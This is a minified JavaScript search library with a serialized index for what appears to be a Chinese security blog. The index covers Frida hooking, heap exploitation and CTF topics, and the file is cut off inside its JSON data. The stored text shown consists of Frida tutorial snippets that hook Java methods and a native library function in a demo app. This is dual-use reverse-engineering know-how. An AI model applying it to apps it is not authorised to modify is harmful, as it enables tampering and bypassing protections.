const nt="ENTRIES",V="KEYS",T="VALUES",F="";class D{set;_type;_path;constructor(t,s){const n=t._tree,u=Array.from(n.keys());this.set=t,this._type=s,this._path=u.length>0?[{node:n,keys:u}]:[]}next(){const t=this.dive();return this.backtrack(),t}dive(){if(this._path.length===0)return{done:!0,value:void 0};const{node:t,keys:s}=E(this._path);if(E(s)===F)return{done:!1,value:this.result()};const n=t.get(E(s));return this._path.push({node:n,keys:Array.from(n.keys())}),this.dive()}backtrack(){if(this._path.length===0)return;const t=E(this._path).keys;t.pop(),!(t.length>0)&&(this._path.pop(),this.backtrack())}key(){return this.set._prefix+this._path.map(({keys:t})=>E(t)).filter(t=>t!==F).join("")}value(){return E(this._path).node.get(F)}result(){switch(this._type){case T:return this.value();case V:return this.key();default:return[this.key(),this.value()]}}[Symbol.iterator](){return this}}const E=e=>e[e.length-1],ut=(e,t,s)=>{const n=new Map;if(t===void 0)return n;const u=t.length+1,o=u+s,i=new Uint8Array(o*u).fill(s+1);for(let r=0;r<u;++r)i[r]=r;for(let r=1;r<o;++r)i[r*u]=r;return R(e,t,s,n,i,1,u,""),n},R=(e,t,s,n,u,o,i,r)=>{const d=o*i;t:for(const l of e.keys())if(l===F){const a=u[d-1];a<=s&&n.set(r,[e.get(l),a])}else{let a=o;for(let h=0;h<l.length;++h,++a){const m=l[h],p=i*a,f=p-i;let c=u[p];const g=Math.max(0,a-s-1),_=Math.min(i-1,a+s);for(let y=g;y<_;++y){const b=m!==t[y],z=u[f+y]+ +b,A=u[f+y+1]+1,w=u[p+y]+1,L=u[p+y+1]=Math.min(z,A,w);L<c&&(c=L)}if(c>s)continue t}R(e.get(l),t,s,n,u,a,i,r+l)}};class C{_tree;_prefix;_size=void 0;constructor(t=new Map,s=""){this._tree=t,this._prefix=s}atPrefix(t){if(!t.startsWith(this._prefix))throw new Error("Mismatched prefix");const[s,n]=x(this._tree,t.slice(this._prefix.length));if(s===void 0){const[u,o]=M(n);for(const i of u.keys())if(i!==F&&i.startsWith(o)){const r=new Map;return r.set(i.slice(o.length),u.get(i)),new C(r,t)}}return new C(s,t)}clear(){this._size=void 0,this._tree.clear()}delete(t){return this._size=void 0,ot(this._tree,t)}entries(){return new D(this,nt)}forEach(t){for(const[s,n]of this)t(s,n,this)}fuzzyGet(t,s){return ut(this._tree,t,s)}get(t){const s=I(this._tree,t);return s!==void 0?s.get(F):void 0}has(t){const s=I(this._tree,t);return s!==void 0&&s.has(F)}keys(){return new D(this,V)}set(t,s){if(typeof t!="string")throw new Error("key must be a string");return this._size=void 0,O(this._tree,t).set(F,s),this}get size(){if(this._size)return this._size;this._size=0;const t=this.entries();for(;!t.next().done;)this._size+=1;return this._size}update(t,s){if(typeof t!="string")throw new Error("key must be a string");this._size=void 0;const n=O(this._tree,t);return n.set(F,s(n.get(F))),this}fetch(t,s){if(typeof t!="string")throw new Error("key must be a string");this._size=void 0;const n=O(this._tree,t);let u=n.get(F);return u===void 0&&n.set(F,u=s()),u}values(){return new D(this,T)}[Symbol.iterator](){return this.entries()}static from(t){const s=new C;for(const[n,u]of t)s.set(n,u);return s}static fromObject(t){return C.from(Object.entries(t))}}const x=(e,t,s=[])=>{if(t.length===0||e==null)return[e,s];for(const n of e.keys())if(n!==F&&t.startsWith(n))return s.push([e,n]),x(e.get(n),t.slice(n.length),s);return s.push([e,t]),x(void 0,"",s)},I=(e,t)=>{if(t.length===0||e==null)return e;for(const s of e.keys())if(s!==F&&t.startsWith(s))return I(e.get(s),t.slice(s.length))},O=(e,t)=>{const s=t.length;t:for(let n=0;e&&n<s;){for(const o of e.keys())if(o!==F&&t[n]===o[0]){const i=Math.min(s-n,o.length);let r=1;for(;r<i&&t[n+r]===o[r];)++r;const d=e.get(o);if(r===o.length)e=d;else{const l=new Map;l.set(o.slice(r),d),e.set(t.slice(n,n+r),l),e.delete(o),e=l}n+=r;continue t}const u=new Map;return e.set(t.slice(n),u),u}return e},ot=(e,t)=>{const[s,n]=x(e,t);if(s!==void 0){if(s.delete(F),s.size===0)W(n);else if(s.size===1){const[u,o]=s.entries().next().value;q(n,u,o)}}},W=e=>{if(e.length===0)return;const[t,s]=M(e);if(t.delete(s),t.size===0)W(e.slice(0,-1));else if(t.size===1){const[n,u]=t.entries().next().value;n!==F&&q(e.slice(0,-1),n,u)}},q=(e,t,s)=>{if(e.length===0)return;const[n,u]=M(e);n.set(u+t,s),n.delete(u)},M=e=>e[e.length-1],it=(e,t)=>{const s=e._idToShortId.get(t);if(s!=null)return e._storedFields.get(s)},rt=/[\n\r -#%-*,-/:;?@[-\]_{}\u00A0\u00A1\u00A7\u00AB\u00B6\u00B7\u00BB\u00BF\u037E\u0387\u055A-\u055F\u0589\u058A\u05BE\u05C0\u05C3\u05C6\u05F3\u05F4\u0609\u060A\u060C\u060D\u061B\u061E\u061F\u066A-\u066D\u06D4\u0700-\u070D\u07F7-\u07F9\u0830-\u083E\u085E\u0964\u0965\u0970\u09FD\u0A76\u0AF0\u0C77\u0C84\u0DF4\u0E4F\u0E5A\u0E5B\u0F04-\u0F12\u0F14\u0F3A-\u0F3D\u0F85\u0FD0-\u0FD4\u0FD9\u0FDA\u104A-\u104F\u10FB\u1360-\u1368\u1400\u166E\u1680\u169B\u169C\u16EB-\u16ED\u1735\u1736\u17D4-\u17D6\u17D8-\u17DA\u1800-\u180A\u1944\u1945\u1A1E\u1A1F\u1AA0-\u1AA6\u1AA8-\u1AAD\u1B5A-\u1B60\u1BFC-\u1BFF\u1C3B-\u1C3F\u1C7E\u1C7F\u1CC0-\u1CC7\u1CD3\u2000-\u200A\u2010-\u2029\u202F-\u2043\u2045-\u2051\u2053-\u205F\u207D\u207E\u208D\u208E\u2308-\u230B\u2329\u232A\u2768-\u2775\u27C5\u27C6\u27E6-\u27EF\u2983-\u2998\u29D8-\u29DB\u29FC\u29FD\u2CF9-\u2CFC\u2CFE\u2CFF\u2D70\u2E00-\u2E2E\u2E30-\u2E4F\u3000-\u3003\u3008-\u3011\u3014-\u301F\u3030\u303D\u30A0\u30FB\uA4FE\uA4FF\uA60D-\uA60F\uA673\uA67E\uA6F2-\uA6F7\uA874-\uA877\uA8CE\uA8CF\uA8F8-\uA8FA\uA8FC\uA92E\uA92F\uA95F\uA9C1-\uA9CD\uA9DE\uA9DF\uAA5C-\uAA5F\uAADE\uAADF\uAAF0\uAAF1\uABEB\uFD3E\uFD3F\uFE10-\uFE19\uFE30-\uFE52\uFE54-\uFE61\uFE63\uFE68\uFE6A\uFE6B\uFF01-\uFF03\uFF05-\uFF0A\uFF0C-\uFF0F\uFF1A\uFF1B\uFF1F\uFF20\uFF3B-\uFF3D\uFF3F\uFF5B\uFF5D\uFF5F-\uFF65]+/u,S="or",$="and",ct="and_not",lt=(e,t)=>{e.includes(t)||e.push(t)},P=(e,t)=>{for(const s of t)e.includes(s)||e.push(s)},N=({score:e},{score:t})=>t-e,ht=()=>new Map,k=e=>{const t=new Map;for(const s of Object.keys(e))t.set(parseInt(s,10),e[s]);return t},G=(e,t)=>Object.prototype.hasOwnProperty.call(e,t)?e[t]:void 0,dt={[S]:(e,t)=>{for(const s of t.keys()){const n=e.get(s);if(n==null)e.set(s,t.get(s));else{const{score:u,terms:o,match:i}=t.get(s);n.score=n.score+u,n.match=Object.assign(n.match,i),P(n.terms,o)}}return e},[$]:(e,t)=>{const s=new Map;for(const n of t.keys()){const u=e.get(n);if(u==null)continue;const{score:o,terms:i,match:r}=t.get(n);P(u.terms,i),s.set(n,{score:u.score+o,terms:u.terms,match:Object.assign(u.match,r)})}return s},[ct]:(e,t)=>{for(const s of t.keys())e.delete(s);return e}},at=(e,t,s,n,u,o)=>{const{k:i,b:r,d}=o;return Math.log(1+(s-t+.5)/(t+.5))*(d+e*(i+1)/(e+i*(1-r+r*n/u)))},ft=e=>(t,s,n)=>{const u=typeof e.fuzzy=="function"?e.fuzzy(t,s,n):e.fuzzy||!1,o=typeof e.prefix=="function"?e.prefix(t,s,n):e.prefix===!0;return{term:t,fuzzy:u,prefix:o}},H=(e,t,s,n)=>{for(const u of Object.keys(e._fieldIds))if(e._fieldIds[u]===s){e._options.logger("warn",`SlimSearch: document with ID ${e._documentIds.get(t)} has changed before removal: term "${n}" was not present in field "${u}". Removing a document after it has changed can corrupt the index!`,"version_conflict");return}},gt=(e,t,s,n)=>{if(!e._index.has(n)){H(e,s,t,n);return}const u=e._index.fetch(n,ht),o=u.get(t);o==null||o.get(s)==null?H(e,s,t,n):o.get(s)<=1?o.size<=1?u.delete(t):o.delete(s):o.set(s,o.get(s)-1),e._index.get(n).size===0&&e._index.delete(n)},mt={k:1.2,b:.7,d:.5},pt={idField:"id",extractField:(e,t)=>e[t],tokenize:e=>e.split(rt),processTerm:e=>e.toLowerCase(),fields:void 0,searchOptions:void 0,storeFields:[],logger:(e,t)=>{typeof console?.[e]=="function"&&console[e](t)},autoVacuum:!0},J={combineWith:S,prefix:!1,fuzzy:!1,maxFuzzy:6,boost:{},weights:{fuzzy:.45,prefix:.375},bm25:mt},Ft={combineWith:$,prefix:(e,t,s)=>t===s.length-1},_t={batchSize:1e3,batchWait:10},U={minDirtFactor:.1,minDirtCount:20},yt={..._t,...U},Y=(e,t=S)=>{if(e.length===0)return new Map;const s=t.toLowerCase();return e.reduce(dt[s])||new Map},B=(e,t,s,n,u,o,i,r,d=new Map)=>{if(u==null)return d;for(const l of Object.keys(o)){const a=o[l],h=e._fieldIds[l],m=u.get(h);if(m==null)continue;let p=m.size;const f=e._avgFieldLength[h];for(const c of m.keys()){if(!e._documentIds.has(c)){gt(e,h,c,s),p-=1;continue}const g=i?i(e._documentIds.get(c),s,e._storedFields.get(c)):1;if(!g)continue;const _=m.get(c),y=e._fieldLength.get(c)[h],b=at(_,p,e._documentCount,y,f,r),z=n*a*g*b,A=d.get(c);if(A){A.score+=z,lt(A.terms,t);const w=G(A.match,s);w?w.push(l):A.match[s]=[l]}else d.set(c,{score:z,terms:[t],match:{[s]:[l]}})}}return d},At=(e,t,s)=>{const n={...e._options.searchOptions,...s},u=(n.fields||e._options.fields).reduce((c,g)=>({...c,[g]:G(n.boost,g)||1}),{}),{boostDocument:o,weights:i,maxFuzzy:r,bm25:d}=n,{fuzzy:l,prefix:a}={...J.weights,...i},h=e._index.get(t.term),m=B(e,t.term,t.term,1,h,u,o,d);let p,f;if(t.prefix&&(p=e._index.atPrefix(t.term)),t.fuzzy){const c=t.fuzzy===!0?.2:t.fuzzy,g=c<1?Math.min(r,Math.round(t.term.length*c)):c;g&&(f=e._index.fuzzyGet(t.term,g))}if(p)for(const[c,g]of p){const _=c.length-t.term.length;if(!_)continue;f?.delete(c);const y=a*c.length/(c.length+.3*_);B(e,t.term,c,y,g,u,o,d,m)}if(f)for(const c of f.keys()){const[g,_]=f.get(c);if(!_)continue;const y=l*c.length/(c.length+_);B(e,t.term,c,y,g,u,o,d,m)}return m},X=(e,t,s={})=>{if(typeof t!="string"){const a={...s,...t,queries:void 0},h=t.queries.map(m=>X(e,m,a));return Y(h,a.combineWith)}const{tokenize:n,processTerm:u,searchOptions:o}=e._options,i={tokenize:n,processTerm:u,...o,...s},{tokenize:r,processTerm:d}=i,l=r(t).flatMap(a=>d(a)).filter(a=>!!a).map(ft(i)).map(a=>At(e,a,i));return Y(l,i.combineWith)},K=(e,t,s={})=>{const n=X(e,t,s),u=[];for(const[o,{score:i,terms:r,match:d}]of n){const l=r.length,a={id:e._documentIds.get(o),score:i*l,terms:Object.keys(d),match:d};Object.assign(a,e._storedFields.get(o)),(s.filter==null||s.filter(a))&&u.push(a)}return u.sort(N),u},Ct=(e,t,s={})=>{s={...e._options.autoSuggestOptions,...s};const n=new Map;for(const{score:o,terms:i}of K(e,t,s)){const r=i.join(" "),d=n.get(r);d!=null?(d.score+=o,d.count+=1):n.set(r,{score:o,terms:i,count:1})}const u=[];for(const[o,{score:i,terms:r,count:d}]of n)u.push({suggestion:o,terms:r,score:i/d});return u.sort(N),u};class Et{_options;_index;_documentCount;_documentIds;_idToShortId;_fieldIds;_fieldLength;_avgFieldLength;_nextId;_storedFields;_dirtCount;_currentVacuum;_enqueuedVacuum;_enqueuedVacuumConditions;constructor(t){if(t?.fields==null)throw new Error('SlimSearch: option "fields" must be provided');const s=t.autoVacuum==null||t.autoVacuum===!0?yt:t.autoVacuum;this._options={...pt,...t,autoVacuum:s,searchOptions:{...J,...t.searchOptions||{}},autoSuggestOptions:{...Ft,...t.autoSuggestOptions||{}}},this._index=new C,this._documentCount=0,this._documentIds=new Map,this._idToShortId=new Map,this._fieldIds={},this._fieldLength=new Map,this._avgFieldLength=[],this._nextId=0,this._storedFields=new Map,this._dirtCount=0,this._currentVacuum=null,this._enqueuedVacuum=null,this._enqueuedVacuumConditions=U,this.addFields(this._options.fields)}get isVacuuming(){return this._currentVacuum!=null}get dirtCount(){return this._dirtCount}get dirtFactor(){return this._dirtCount/(1+this._documentCount+this._dirtCount)}get documentCount(){return this._documentCount}get termCount(){return this._index.size}toJSON(){const t=[];for(const[s,n]of this._index){const u={};for(const[o,i]of n)u[o]=Object.fromEntries(i);t.push([s,u])}return{documentCount:this._documentCount,nextId:this._nextId,documentIds:Object.fromEntries(this._documentIds),fieldIds:this._fieldIds,fieldLength:Object.fromEntries(this._fieldLength),averageFieldLength:this._avgFieldLength,storedFields:Object.fromEntries(this._storedFields),dirtCount:this._dirtCount,index:t,serializationVersion:2}}addFields(t){for(let s=0;s<t.length;s++)this._fieldIds[t[s]]=s}}const zt=({index:e,documentCount:t,nextId:s,documentIds:n,fieldIds:u,fieldLength:o,averageFieldLength:i,storedFields:r,dirtCount:d,serializationVersion:l},a)=>{if(l!==1&&l!==2)throw new Error("SlimSearch: cannot deserialize an index created with an incompatible version");const h=new Et(a);h._documentCount=t,h._nextId=s,h._documentIds=k(n),h._idToShortId=new Map,h._fieldIds=u,h._fieldLength=k(o),h._avgFieldLength=i,h._storedFields=k(r),h._dirtCount=d||0,h._index=new C;for(const[m,p]of h._documentIds)h._idToShortId.set(p,m);for(const[m,p]of e){const f=new Map;for(const c of Object.keys(p)){let g=p[c];l===1&&(g=g.ds),f.set(parseInt(c,10),k(g))}h._index.set(m,f)}return h},Q=Object.entries,wt=Object.fromEntries,j=(e,t)=>{const s=e.toLowerCase(),n=t.toLowerCase(),u=[];let o=0,i=0;const r=(l,a=!1)=>{let h="";i===0?h=l.length>20?`… ${l.slice(-20)}`:l:a?h=l.length+i>100?`${l.slice(0,100-i)}… `:l:h=l.length>20?`${l.slice(0,20)} … ${l.slice(-20)}`:l,h&&u.push(h),i+=h.length,a||(u.push(["mark",t]),i+=t.length,i>=100&&u.push(" …"))};let d=s.indexOf(n,o);if(d===-1)return null;for(;d>=0;){const l=d+n.length;if(r(e.slice(o,d)),o=l,i>100)break;d=s.indexOf(n,o)}return i<100&&r(e.slice(o),!0),u},Z=/[\u4e00-\u9fa5]/g,tt=(e={})=>({fuzzy:.2,prefix:!0,processTerm:t=>{const s=t.match(Z)||[],n=t.replace(Z,"").toLowerCase();return n?[n,...s]:[...s]},...e}),xt=(e,t)=>t.contents.reduce((s,[,n])=>s+n,0)-e.contents.reduce((s,[,n])=>s+n,0),kt=(e,t)=>Math.max(...t.contents.map(([,s])=>s))-Math.max(...e.contents.map(([,s])=>s)),et=(e,t,s={})=>{const n={};return K(t,e,tt({boost:{h:2,t:1,c:4},...s})).forEach(u=>{const{id:o,terms:i,score:r}=u,d=o.includes("@"),l=o.includes("#"),[a,h]=o.split(/[#@]/),m=i.sort((f,c)=>f.length-c.length).filter((f,c)=>i.slice(c+1).every(g=>!g.includes(f))),{contents:p}=n[a]??={title:"",contents:[]};if(d)p.push([{type:"customField",key:a,index:h,display:m.map(f=>u.c.map(c=>j(c,f))).flat().filter(f=>f!==null)},r]);else{const f=m.map(c=>j(u.h,c)).filter(c=>c!==null);if(f.length&&p.push([{type:l?"heading":"title",key:a,...l&&{anchor:h},display:f},r]),"t"in u)for(const c of u.t){const g=m.map(_=>j(c,_)).filter(_=>_!==null);g.length&&p.push([{type:"text",key:a,...l&&{anchor:h},display:g},r])}}}),Q(n).sort(([,u],[,o])=>"max"==="total"?xt(u,o):kt(u,o)).map(([u,{title:o,contents:i}])=>{if(!o){const r=it(t,u);r&&(o=r.h)}return{title:o,contents:i.map(([r])=>r)}})},st=(e,t,s={})=>Ct(t,e,tt(s)).map(({suggestion:n})=>n),v=wt(Q(JSON.parse("{\"/\":{\"documentCount\":99,\"nextId\":99,\"documentIds\":{\"0\":\"v-8daa1a0e\",\"1\":\"v-623b66b3\",\"2\":\"v-623b66b3#映射端口\",\"3\":\"v-623b66b3#pc查询手机的进程\",\"4\":\"v-623b66b3#hook相关\",\"5\":\"v-623b66b3#hook-js脚本\",\"6\":\"v-623b66b3#附着脚本\",\"7\":\"v-623b66b3#js代码的书写\",\"8\":\"v-623b66b3#使用java的平台\",\"9\":\"v-623b66b3#获取指定的java类\",\"10\":\"v-623b66b3#调用原本的函数\",\"11\":\"v-623b66b3#hook重载函数\",\"12\":\"v-623b66b3#hook构造方法\",\"13\":\"v-623b66b3#修改类的字段\",\"14\":\"v-623b66b3#枚举所有的类和方法\",\"15\":\"v-623b66b3#hook-so中的函数\",\"16\":\"v-4e13633e\",\"17\":\"v-4e13633e#实战\",\"18\":\"v-4e13633e#获取包名\",\"19\":\"v-4e13633e#hook-一个测试脚本\",\"20\":\"v-a8c94236\",\"21\":\"v-a8c94236#连接\",\"22\":\"v-c37bfef4\",\"23\":\"v-c37bfef4#栈迁移\",\"24\":\"v-c37bfef4#栈迁移的大致操作\",\"25\":\"v-c37bfef4#栈迁移核心\",\"26\":\"v-5704cdc3\",\"27\":\"v-5704cdc3#重要知识点\",\"28\":\"v-5704cdc3#tcahe机制\",\"29\":\"v-5704cdc3#机制\",\"30\":\"v-5704cdc3#利用tcache泄露地址\",\"31\":\"v-0c00bb85\",\"32\":\"v-0c00bb85#原理\",\"33\":\"v-0c00bb85#脚本\",\"34\":\"v-1e30558e\",\"35\":\"v-1e30558e#分析一下题\",\"36\":\"v-1e30558e#chunk分析\",\"37\":\"v-1e30558e#漏洞学习\",\"38\":\"v-1e30558e#先学习unlink漏洞\",\"39\":\"v-1e30558e#流程\",\"40\":\"v-1e30558e#调试技巧\",\"41\":\"v-1e30558e#学习路线\",\"42\":\"v-d3af13ba\",\"43\":\"v-d3af13ba#部分前置知识讲解\",\"44\":\"v-d3af13ba#got表和plt表详细解说\",\"45\":\"v-d3af13ba#dl-runtime-resolve部分详细解说\",\"46\":\"v-d3af13ba#reloc-index\",\"47\":\"v-0ba3e221\",\"48\":\"v-0ba3e221#堆管理器\",\"49\":\"v-0ba3e221#流程\",\"50\":\"v-0ba3e221#chunk结构\",\"51\":\"v-0ba3e221#申请内存的过程\",\"52\":\"v-72bc8bd4\",\"53\":\"v-72bc8bd4#tsl-了解\",\"54\":\"v-72bc8bd4#gdb-如何查-fs\",\"55\":\"v-72bc8bd4#bin\",\"56\":\"v-72bc8bd4#free-源码分析\",\"57\":\"v-72bc8bd4#malloc源码分析\",\"58\":\"v-72bc8bd4#fastbin\",\"59\":\"v-72bc8bd4#tcache\",\"60\":\"v-72bc8bd4#fastbin-dup\",\"61\":\"v-72bc8bd4#tcache利用\",\"62\":\"v-11323e4a\",\"63\":\"v-11323e4a#tcache-dup\",\"64\":\"v-11323e4a#unsortedbin\",\"65\":\"v-11323e4a#consolidate\",\"66\":\"v-11323e4a#unsafeunlink-off-by-one\",\"67\":\"v-18456924\",\"68\":\"v-18456924#题目\",\"69\":\"v-18456924#原理\",\"70\":\"v-18456924#实践\",\"71\":\"v-18456924#修改思路\",\"72\":\"v-18456924#结果\",\"73\":\"v-9db4b450\",\"74\":\"v-9db4b450#程序寻找libc的顺序\",\"75\":\"v-9db4b450#linux程序加载简化流程\",\"76\":\"v-9db4b450#查看程序当前信息\",\"77\":\"v-9db4b450#修改程序的ld和libc地址\",\"78\":\"v-4718a5d4\",\"79\":\"v-4718a5d4#linux中常用的指令\",\"80\":\"v-4718a5d4#ifs变量\",\"81\":\"v-4718a5d4#ifs-的工作原理\",\"82\":\"v-4718a5d4#这里举列子\",\"83\":\"v-4718a5d4#payload\",\"84\":\"v-b7b357a8\",\"85\":\"v-b7b357a8#实验float的存储数据\",\"86\":\"v-b7b357a8#尝试覆盖\",\"87\":\"v-596613ec\",\"88\":\"v-596613ec#解释部分函数\",\"89\":\"v-596613ec#正式做题\",\"90\":\"v-596613ec#流程\",\"91\":\"v-596613ec#动调\",\"92\":\"v-596613ec#脚本\",\"93\":\"v-1eb8e595\",\"94\":\"v-e1e3da16\",\"95\":\"v-6366463d\",\"96\":\"v-13167faa\",\"97\":\"v-4b630a84\",\"98\":\"v-76d1c547\"},\"fieldIds\":{\"h\":0,\"t\":1,\"c\":2},\"fieldLength\":{\"0\":[2,30],\"1\":[1,10],\"2\":[2,5],\"3\":[1,4],\"4\":[1],\"5\":[2],\"6\":[1,19],\"7\":[1],\"8\":[1,6],\"9\":[1,45],\"10\":[1,11],\"11\":[1,69],\"12\":[1,54],\"13\":[1,75],\"14\":[1,46],\"15\":[2,49],\"16\":[1,6],\"17\":[1],\"18\":[1,8],\"19\":[2,127],\"20\":[2],\"21\":[1,29],\"22\":[3],\"23\":[1,3],\"24\":[1,15],\"25\":[1,78],\"26\":[5],\"27\":[1,29],\"28\":[1,16],\"29\":[1,62],\"30\":[1,39],\"31\":[1,5],\"32\":[1,22],\"33\":[1,40],\"34\":[3],\"35\":[1,53],\"36\":[1,20],\"37\":[1,6],\"38\":[1,20],\"39\":[1,52],\"40\":[1,1],\"41\":[2,2],\"42\":[1],\"43\":[1],\"44\":[1,109],\"45\":[4,15],\"46\":[2,57],\"47\":[1,9],\"48\":[1,16],\"49\":[1,2],\"50\":[1,44],\"51\":[1,35],\"52\":[3,11],\"53\":[2],\"54\":[4,11],\"55\":[1],\"56\":[2,16],\"57\":[1,10],\"58\":[1,5],\"59\":[1,21],\"60\":[2,152],\"61\":[1,3],\"62\":[4,1],\"63\":[2,94],\"64\":[1,7],\"65\":[1,58],\"66\":[5,63],\"67\":[5,8],\"68\":[1,8],\"69\":[1,29],\"70\":[1,117],\"71\":[1,90],\"72\":[1,7],\"73\":[1,20],\"74\":[1,31],\"75\":[1,22],\"76\":[1,10],\"77\":[5,32],\"78\":[3,42],\"79\":[1,140],\"80\":[1,2],\"81\":[2,19],\"82\":[2,15],\"83\":[1,1],\"84\":[4,62],\"85\":[1,76],\"86\":[1,33],\"87\":[1,1],\"88\":[1,58],\"89\":[1,77],\"90\":[1,45],\"91\":[1,76],\"92\":[1,85],\"93\":[1],\"94\":[1],\"95\":[1],\"96\":[1],\"97\":[2],\"98\":[1]},\"averageFieldLength\":[1.5151515151515151,34.52851937540172],\"storedFields\":{\"0\":{\"h\":\"Blog Home\",\"t\":[\"This is a blog home page demo.\",\"To use this layout, you should set both layout: BlogHome and home: true in the page front matter.\",\"For related configuration docs, please see blog homepage.\"]},\"1\":{\"h\":\"frida的基本使用\",\"t\":[\"参考文章Android之Frida框架完全使用指南_android frida-CSDN博客推荐下载书的网站:无名图书 | 一个好看的电子书网站 (book123.info)\"]},\"2\":{\"h\":\"映射端口:\",\"t\":[\"adb forward tcp:xxxx tcp:xxxx \"]},\"3\":{\"h\":\"pc查询手机的进程\",\"t\":[\"frida-ps -U \"]},\"4\":{\"h\":\"hook相关\"},\"5\":{\"h\":\"hook js脚本\"},\"6\":{\"h\":\"附着脚本\",\"t\":[\"启动并且附带脚本\",\"frida -U -f xxxxxx.apk -l xxx.js --no-pause \",\"这里的--no-pause意思是在程序启动后不要停止程序的进程\",\"这里也可以在启动后再 去hook脚本\",\"frida -U -f xxxxx.apk --no-pause %load xxxx.js \"]},\"7\":{\"h\":\"js代码的书写\"},\"8\":{\"h\":\"使用java的平台\",\"t\":[\"使用java平台—>Java.perform(function () {}); \",\"相当于向java层提供了一个callback函数 以便于交互\"]},\"9\":{\"h\":\"获取指定的java类\",\"t\":[\"Java.use(className) \",\"这里引用一下参考文章的列子\",\"当我们获取到Java类之后，我们直接通过 <wrapper>.<method>.implementations =function() {}的方式来hook wrapper类的method方法，不管是实例方法还是静态方法都可以\",\"function main() { //使用java平台 Java.perform( function() { //获取java类 var student=Java.use(\\\"com.example.hookdemo01.Student\\\"); //hook Add方法(重写Add方法) student.Add.implementation=function(a,b) { //修改参数 a=123; b=456; //调用原来的函数 var res = this.Add(a,b); //输出结果 console.log(a,b,res); return res; } } ); } setImmediate(main) \"]},\"10\":{\"h\":\"调用原本的函数\",\"t\":[\"上面举的列子 中出现了调用原本的函数 所以我们其实可以在callback函数里面用this.FUNCTION_NAME来调用原本的函数\",\"<wrapper>.<method>.implementations =function() { this.<method>(); } \"]},\"11\":{\"h\":\"hook重载函数\",\"t\":[\"这里重载函数是java里面的一个特性 就是同一个函数名字 不同的参数列表 可以构造多个同名字的函数 在调用的时候只需要修改参数就可以实现调用不同的实现由于函数名字是一样的所以我猜测frida就难以仅仅靠一个名字来实现hook了 所以我们需要overload标明参数\",\"类似文章中举列子的一样\",\"要hook的代码\",\"public class Student { static public int Add(int a,int b){ return a+b; } static public String test(){ return \\\"test\\\"; } // 要hook的函数 static public String test(int num){ return \\\"test2--\\\"+num; } static public String test(String str){ return str; } } \",\"js代码\",\"//hook重载方法 function hookTest1() { //获取java类 var student=Java.use(\\\"com.example.hookdemo01.Student\\\"); //hook test student.test.overload('int').implementation=function(a) { //修改参数 a=123; //调用原来的函数 var res = this.test(a); //输出结果 console.log(a,res); return res; } } \",\"获取某个重载函数的全部数量\",\"<class>.<function>.overloads.length; \",\"用提取数组的方式依次hook这些重载函数\",\"//hook所有重载函数 function hookTest2() { //获取java类 var student=Java.use(\\\"com.example.hookdemo01.Student\\\"); //重载方法的个数 var overlength=student.test.overloads.length; //循环hook所有重载方法 for(var i=0;i<overlength;i++) { student.test.overloads[i].implementation=function() { //打印参数个数 console.log(arguments.length); return this.test.apply(this,arguments); } } } \"]},\"12\":{\"h\":\"hook构造方法\",\"t\":[\"这里先解释一下什么是构造方法java中类在定义的时候 程序员可以选择显性地去书写和类同名地一个public方法 也可以不写 java会自动给你补上(粗鄙理解)这个方法有什么用呢 就是在这个类实列化的时候 触发 完成类似于初始化的操作比如现在我有类Student那么我在Student a = new Student();的时候相当于会自动去调用函数:a.Student();由于这个是开发知识就不细讲了()\",\"稍微举列子:\",\"package dick; public class Test { public Test() { System.out.print(\\\"test\\\"); } } public class dick { public static void main (String[] args) { Test a = new Test(); } } // 结果:test \",\"对应js的写法\",\"//hook构造函数 function hookTest3() { //获取java类 var student=Java.use(\\\"com.example.hookdemo01.Test\\\"); student.$init.implementation=function() { //调用原函数 this.$init(name,age); //调用构造函数 //student.$new(\\\"guishou\\\",888); } } \"]},\"13\":{\"h\":\"修改类的字段\",\"t\":[\"这里的字段指的是类中定义的成员属性然后这里修改非静态的字段用到的是java.choose函数 这个函数第一个参数就是我们要遍历的类随后我们放入一个类似于回调函数的对象进去这个对象包含:\",\"onMatch\",\"这个key对应的value是一个callback函数 这里会去找到程序中所有实现了指定类的对象 也就是找到所有类型为这个类的对象\",\"相当于遍历 没找到一个对象就会触发这个callback 所以在callback函数中我们的操作对象是每一个对象\",\"onCompete\",\"这个key对应的value也是一个callback函数 在整个搜索流程完成的时候会调用\",\"import java.lang.System.Logger; public class Student { public String name; public int age; private int number; private static String nickname = \\\"Flags\\\"; public Student (String name,int age){ this.age = age; this.name = name; } public void PrintStudent(){ this.number = 888; Log.d(this.name,\\\"nickName:\\\"+this.nickname+\\\"number:\\\"+this.number); } public static void main(String[] args) { System.out.println(\\\"Hello World\\\"); } } \",\"我们这里选择修改nickname这个属性\",\"//修改类字段 function hookTest4() { //获取java类 var student=Java.use(\\\"com.example.hookdemo01.Student\\\"); //修改静态字段 student.nickname.value=\\\"GuiShouFlags\\\"; console.log(student.nickname.value); //修改非静态字段 Java.choose(\\\"com.example.hookdemo01.Student\\\",{ //每遍历一个对象都会调用onMatch onMatch:function(obj) { //修改每个对象的字段 obj.number.value=999; console.log(obj.number.value); //字段名和函数名相同需要加下划线 //obj._number.value=999; }, //遍历完成后调用onComplete onComplete:function() { } }); } \"]},\"14\":{\"h\":\"枚举所有的类和方法\",\"t\":[\"这里很多前提知识\",\"function hookTest6() { //枚举已经加载的类 异步方式 Java.enumerateLoadedClasses({ //每枚举一个类调用一次 onMatch:function(name,handler) { //对类名进行过滤 if(name.indexOf(\\\"com.example.hookdemo01\\\")!=-1) { //输出类名 console.log(name); //根据类名获取java类 var clz=Java.use(name); //获取类的所有方法 var methods=clz.class.getDeclaredMethods(); //循环输出所有方法 for(var i=0;i<methods.length();i++) { console.log(methods[i]); } } }, //枚举完成以后调用 onComplete:function() { } }); //枚举已经加载的类 同步方式 var classes=Java.enumerateClassLoadersSync(); for(var i=0;i<methods.classes();i++) { if(classes[i].indexOf(\\\"com.example.hookdemo01\\\")!=-1) { console.log(classes[i]); //枚举方法同上... } } } \"]},\"15\":{\"h\":\"hook so中的函数\",\"t\":[\"这里如果这个函数不是导出函数则我们通过偏移来获取这个函数这个步骤 就是算偏移嘛(应该 错了别打我) libcBaseAddr + offset\",\"//hook无导出函数 function hookTest9() { //so名称 var so_name=\\\"libnative-lib.so\\\"; //要Hook的函数偏移 var fun_off=0x7078; //加载到内存后，函数地址=so地址+函数偏移 var so_base_addr=Module.findBaseAddress(so_name); var add_func=parseInt(so_base_addr,16)+fun_off; var ptr_fun=new NativePointer(add_func); Interceptor.attach(ptr_fun,{ //在hook函数之前执行 onEnter:function(args) { console.log(\\\"hook enter\\\"); }, //在hook函数之后执行 onLeave:function(retval) { console.log(\\\"hook leaver\\\"); } }); } 